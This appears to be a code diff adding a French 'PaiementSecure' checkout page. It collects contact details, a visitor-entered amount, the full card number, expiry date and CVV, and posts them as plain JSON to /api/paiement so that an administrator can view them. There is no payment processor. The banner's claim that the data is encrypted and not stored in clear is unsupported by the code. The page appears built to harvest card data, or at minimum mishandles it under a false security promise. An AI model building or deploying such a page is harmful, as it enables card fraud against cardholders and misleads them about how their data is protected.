@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Paiement sécurisé</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+        body {
+            background: #f4f7fc;
+            display: flex;
+            justify-content: center;
+            padding: 30px 20px;
+        }
+        .app {
+            max-width: 850px;
+            width: 100%;
+            background: white;
+            border-radius: 28px;
+            padding: 35px 30px 20px 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
+        }
+        .header-paiement {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .header-paiement .logo {
+            font-size: 32px;
+            font-weight: 700;
+            color: #0a1a3a;
+        }
+        .header-paiement .logo span {
+            color: #1a4c8c;
+        }
+        .header-paiement .sous-titre {
+            color: #6a7a9a;
+            font-size: 14px;
+            margin-top: 4px;
+        }
+        .tabs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 25px;
+            flex-wrap: wrap;
+            border-bottom: 2px solid #eef2f7;
+            padding-bottom: 12px;
+        }
+        .tab {
+            padding: 10px 22px;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            background: #f0f2f7;
+            color: #4a5a7a;
+            border: none;
+            transition: 0.2s;
+        }
+        .tab.active {
+            background: #1a4c8c;
+            color: white;
+        }
+        .tab:hover {
+            background: #d5dbe8;
+        }
+        .tab.active:hover {
+            background: #0f3a6e;
+        }
+        .page {
+            display: none;
+        }
+        .page.active {
+            display: block;
+        }
+        h2 {
+            font-size: 22px;
+            color: #0a1a3a;
+            margin-bottom: 6px;
+        }
+        .sub {
+            color: #6a7a9a;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        label {
+            display: block;
+            font-weight: 600;
+            font-size: 14px;
+            color: #1a2a4a;
+            margin-bottom: 4px;
+        }
+        label .req {
+            color: #d32f2f;
+        }
+        input,
+        select,
+        textarea {
+            width: 100%;
+            padding: 11px 14px;
+            border: 1.5px solid #dde1e9;
+            border-radius: 12px;
+            font-size: 15px;
+            background: #fafbfc;
+        }
+        input:focus,
+        select:focus,
+        textarea:focus {
+            border-color: #1a4c8c;
+            outline: none;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(26, 76, 140, 0.08);
+        }
+        .row {
+            display: flex;
+            gap: 14px;
+        }
+        .row .form-group {
+            flex: 1;
+        }
+        .btn {
+            padding: 13px 30px;
+            border: none;
+            border-radius: 14px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-primary {
+            background: #1a4c8c;
+            color: white;
+        }
+        .btn-primary:hover {
+            background: #0f3a6e;
+            transform: translateY(-2px);
+        }
+        .btn-secondary {
+            background: #e9edf5;
+            color: #1a2a4a;
+        }
+        .btn-secondary:hover {
+            background: #d5dbe8;
+        }
+        .btn-success {
+            background: #1e7b4c;
+            color: white;
+        }
+        .btn-success:hover {
+            background: #15633b;
+            transform: translateY(-2px);
+        }
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 18px;
+            flex-wrap: wrap;
+        }
+        .btn-group .btn {
+            flex: 1;
+            min-width: 120px;
+        }
+        .status {
+            margin-top: 14px;
+            padding: 12px 16px;
+            border-radius: 12px;
+            display: none;
+            font-weight: 500;
+        }
+        .status.success {
+            display: block;
+            background: #e3f5ec;
+            color: #0e5233;
+            border-left: 4px solid #1e7b4c;
+        }
+        .status.error {
+            display: block;
+            background: #fde8e8;
+            color: #8a2525;
+            border-left: 4px solid #d32f2f;
+        }
+        .secure-box {
+            background: #f0f6ff;
+            border-radius: 14px;
+            padding: 14px 18px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 22px;
+            border: 1px solid #dce6f2;
+        }
+        .secure-box .icon {
+            font-size: 22px;
+        }
+        .secure-box .text {
+            font-size: 14px;
+            color: #1a3c6e;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #cdd5e0;
+            border-top: 1px solid #eef2f7;
+            padding-top: 16px;
+        }
+        .montant-total {
+            background: #f8faff;
+            border-radius: 14px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            border: 1px dashed #dce6f2;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .montant-total .label {
+            font-weight: 600;
+            color: #1a2a4a;
+        }
+        .montant-total .valeur {
+            font-size: 24px;
+            font-weight: 700;
+            color: #0a1a3a;
+        }
+        @media (max-width: 600px) {
+            .app {
+                padding: 20px 16px;
+            }
+            .row {
+                flex-direction: column;
+                gap: 0;
+            }
+            .tabs {
+                gap: 6px;
+            }
+            .tab {
+                padding: 8px 14px;
+                font-size: 13px;
+            }
+            .btn-group {
+                flex-direction: column;
+            }
+            .btn-group .btn {
+                min-width: unset;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="app">
+        <!-- En-tête -->
+        <div class="header-paiement">
+            <div class="logo">💳 <span>Paiement</span>Secure</div>
+            <div class="sous-titre">Paiement sécurisé en 2 étapes</div>
+        </div>
+
+        <!-- Onglets -->
+        <div class="tabs">
+            <button class="tab active" data-page="page1">📋 Informations</button>
+            <button class="tab" data-page="page2">💳 Carte</button>
+        </div>
+
+        <!-- PAGE 1 : Informations client -->
+        <div id="page1" class="page active">
+            <h2>📋 Informations de paiement</h2>
+            <p class="sub">Étape 1/2 – Remplissez vos coordonnées</p>
+
+            <div class="montant-total">
+                <span class="label">💶 Montant à payer</span>
+                <span class="valeur" id="montantAffiche">0,00 €</span>
+            </div>
+
+            <form id="formClient">
+                <div class="row">
+                    <div class="form-group">
+                        <label>Nom complet <span class="req">*</span></label>
+                        <input type="text" id="nom" placeholder="Jean Dupont" required />
+                    </div>
+                    <div class="form-group">
+                        <label>Email <span class="req">*</span></label>
+                        <input type="email" id="email" placeholder="exemple@email.com" required />
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="form-group">
+                        <label>Téléphone <span class="req">*</span></label>
+                        <input type="tel" id="telephone" placeholder="06 12 34 56 78" required />
+                    </div>
+                    <div class="form-group">
+                        <label>Montant (€) <span class="req">*</span></label>
+                        <input type="number" step="0.01" id="montant" placeholder="0.00" required />
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Référence de la commande <span class="req">*</span></label>
+                    <input type="text" id="reference" placeholder="CMD-2026-0042" required />
+                </div>
+                <div class="form-group">
+                    <label>Adresse de facturation</label>
+                    <input type="text" id="adresse" placeholder="12 rue de la République, 75001 Paris" />
+                </div>
+                <div class="form-group">
+                    <label>Commentaires (optionnel)</label>
+                    <textarea id="commentaires" rows="2" placeholder="Informations complémentaires..."></textarea>
+                </div>
+
+                <button type="button" class="btn btn-primary" id="goToCarte" style="width:100%;">
+                    ➡️ Étape suivante – Carte bancaire
+                </button>
+                <div id="status1" class="status"></div>
+            </form>
+        </div>
+
+        <!-- PAGE 2 : Carte bancaire -->
+        <div id="page2" class="page">
+            <h2>💳 Paiement par carte</h2>
+            <p class="sub">Étape 2/2 – Saisissez les informations de votre carte</p>
+
+            <div class="secure-box">
+                <span class="icon">🔐</span>
+                <span class="text"><strong>Paiement sécurisé</strong> – Vos données sont cryptées et ne sont pas stockées en clair.</span>
+            </div>
+
+            <form id="formCarte">
+                <div class="form-group">
+                    <label>Titulaire de la carte <span class="req">*</span></label>
+                    <input type="text" id="titulaire" placeholder="Jean DUPONT" required />
+                </div>
+                <div class="form-group">
+                    <label>Numéro de carte <span class="req">*</span></label>
+                    <input type="text" id="carte" placeholder="1234 5678 9012 3456" maxlength="19" required />
+                    <div style="font-size:12px;color:#9aa3b5;margin-top:4px;">16 chiffres, sans espaces ni tirets</div>
+                </div>
+                <div class="row">
+                    <div class="form-group">
+                        <label>Expiration <span class="req">*</span></label>
+                        <input type="text" id="expiration" placeholder="MM/AA" maxlength="5" required />
+                    </div>
+                    <div class="form-group">
+                        <label>CVV <span class="req">*</span></label>
+                        <input type="password" id="cvv" placeholder="***" maxlength="4" required />
+                    </div>
+                </div>
+
+                <div class="btn-group">
+                    <button type="button" class="btn btn-secondary" id="backToClient">⬅️ Retour</button>
+                    <button type="button" class="btn btn-success" id="submitFinal">✅ Payer maintenant</button>
+                </div>
+                <div id="status2" class="status"></div>
+            </form>
+        </div>
+
+        <div class="footer">💳 Paiement sécurisé – Tous droits réservés</div>
+    </div>
+
+    <script>
+        // Mise à jour du montant affiché
+        document.getElementById('montant').addEventListener('input', function() {
+            const val = parseFloat(this.value) || 0;
+            document.getElementById('montantAffiche').textContent = val.toFixed(2) + ' €';
+        });
+
+        // Navigation onglets
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                this.classList.add('active');
+                document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+                document.getElementById(this.dataset.page).classList.add('active');
+            });
+        });
+
+        // Étape 1 → Étape 2
+        document.getElementById('goToCarte').addEventListener('click', function() {
+            const data = {
+                nom: document.getElementById('nom').value.trim(),
+                email: document.getElementById('email').value.trim(),
+                telephone: document.getElementById('telephone').value.trim(),
+                montant: document.getElementById('montant').value.trim(),
+                reference: document.getElementById('reference').value.trim(),
+                adresse: document.getElementById('adresse').value.trim(),
+                commentaires: document.getElementById('commentaires').value.trim()
+            };
+
+            const status = document.getElementById('status1');
+            const required = ['nom', 'email', 'telephone', 'montant', 'reference'];
+
+            for (let k of required) {
+                if (!data[k] || data[k] === '') {
+                    status.textContent = `❌ Le champ "${k}" est obligatoire.`;
+                    status.className = 'status error';
+                    return;
+                }
+            }
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) {
+                status.textContent = '❌ Email invalide.';
+                status.className = 'status error';
+                return;
+            }
+            if (isNaN(data.montant) || parseFloat(data.montant) <= 0) {
+                status.textContent = '❌ Montant invalide.';
+                status.className = 'status error';
+                return;
+            }
+
+            sessionStorage.setItem('clientData', JSON.stringify(data));
+            status.className = 'status success';
+            status.textContent = '✅ Informations validées ! Passez au paiement.';
+
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelector('[data-page="page2"]').classList.add('active');
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById('page2').classList.add('active');
+        });
+
+        // Retour
+        document.getElementById('backToClient').addEventListener('click', function() {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelector('[data-page="page1"]').classList.add('active');
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById('page1').classList.add('active');
+        });
+
+        // Soumission finale
+        document.getElementById('submitFinal').addEventListener('click', async function() {
+            const clientData = JSON.parse(sessionStorage.getItem('clientData'));
+            if (!clientData) {
+                document.getElementById('status2').textContent = '❌ Veuillez d\'abord remplir l\'étape 1.';
+                document.getElementById('status2').className = 'status error';
+                return;
+            }
+
+            const carteData = {
+                titulaire: document.getElementById('titulaire').value.trim(),
+                carte: document.getElementById('carte').value.replace(/\s/g, ''),
+                expiration: document.getElementById('expiration').value.trim(),
+                cvv: document.getElementById('cvv').value.trim()
+            };
+
+            const status = document.getElementById('status2');
+
+            if (!carteData.titulaire) {
+                status.textContent = '❌ Le nom du titulaire est obligatoire.';
+                status.className = 'status error';
+                return;
+            }
+            if (!/^\d{16}$/.test(carteData.carte)) {
+                status.textContent = '❌ La carte doit contenir 16 chiffres.';
+                status.className = 'status error';
+                return;
+            }
+            if (!/^\d{2}\/\d{2}$/.test(carteData.expiration)) {
+                status.textContent = '❌ Date d\'expiration au format MM/AA.';
+                status.className = 'status error';
+                return;
+            }
+            const [mois, annee] = carteData.expiration.split('/');
+            const now = new Date();
+            const currentMonth = now.getMonth() + 1;
+            const currentYear = now.getFullYear() % 100;
+            if (parseInt(annee) < currentYear || (parseInt(annee) === currentYear && parseInt(mois) < currentMonth)) {
+                status.textContent = '❌ Carte expirée.';
+                status.className = 'status error';
+                return;
+            }
+            if (!/^\d{3,4}$/.test(carteData.cvv)) {
+                status.textContent = '❌ CVV invalide (3 ou 4 chiffres).';
+                status.className = 'status error';
+                return;
+            }
+
+            const fullData = { ...clientData, ...carteData };
+
+            this.disabled = true;
+            this.textContent = '⏳ Traitement...';
+
+            try {
+                const res = await fetch('/api/paiement', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(fullData)
+                });
+                const result = await res.json();
+
+                if (result.success) {
+                    status.className = 'status success';
+                    status.textContent = '✅ Paiement enregistré avec succès !';
+
+                    sessionStorage.removeItem('clientData');
+                    document.getElementById('titulaire').value = '';
+                    document.getElementById('carte').value = '';
+                    document.getElementById('expiration').value = '';
+                    document.getElementById('cvv').value = '';
+
+                    document.querySelectorAll('#formClient input, #formClient textarea, #formClient select')
+                        .forEach(el => el.value = '');
+                    document.getElementById('status1').className = 'status';
+                    document.getElementById('status1').textContent = '';
+                    document.getElementById('montantAffiche').textContent = '0,00 €';
+
+                    setTimeout(() => {
+                        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                        document.querySelector('[data-page="page1"]').classList.add('active');
+                        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+                        document.getElementById('page1').classList.add('active');
+
+                        document.getElementById('status1').className = 'status success';
+                        document.getElementById('status1').textContent =
+                            '✅ Votre paiement a bien été enregistré ! L\'administrateur peut le consulter.';
+                        setTimeout(() => {
+                            document.getElementById('status1').className = 'status';
+                            document.getElementById('status1').textContent = '';
+                        }, 5000);
+                    }, 1500);
+                } else {
+                    status.textContent = '❌ Erreur serveur : ' + result.message;
+                    status.className = 'status error';
+                }
+            } catch (err) {
+                status.textContent = '❌ Erreur de connexion au serveur.';
+                status.className = 'status error';
+            }
+
+            this.disabled = false;
+            this.textContent = '✅ Payer maintenant';
+        });
+
+        // Formatage carte
+        document.getElementById('carte').addEventListener('input', function() {
+            let val = this.value.replace(/\D/g, '');
+            if (val.length > 16) val = val.slice(0, 16);
+            let f = '';
+            for (let i = 0; i < val.length; i++) {
+                if (i > 0 && i % 4 === 0) f += ' ';
+                f += val[i];
+            }
+            this.value = f;
+        });
+
+        // Formatage expiration
+        document.getElementById('expiration').addEventListener('input', function() {
+            let val = this.value.replace(/\D/g, '');
+            if (val.length > 4) val = val.slice(0, 4);
+            if (val.length >= 2) {
+                this.value = val.slice(0, 2) + '/' + val.slice(2);
+            } else {
+                this.value = val;
+            }
+        });
+    </script>
+</body>
+</html>
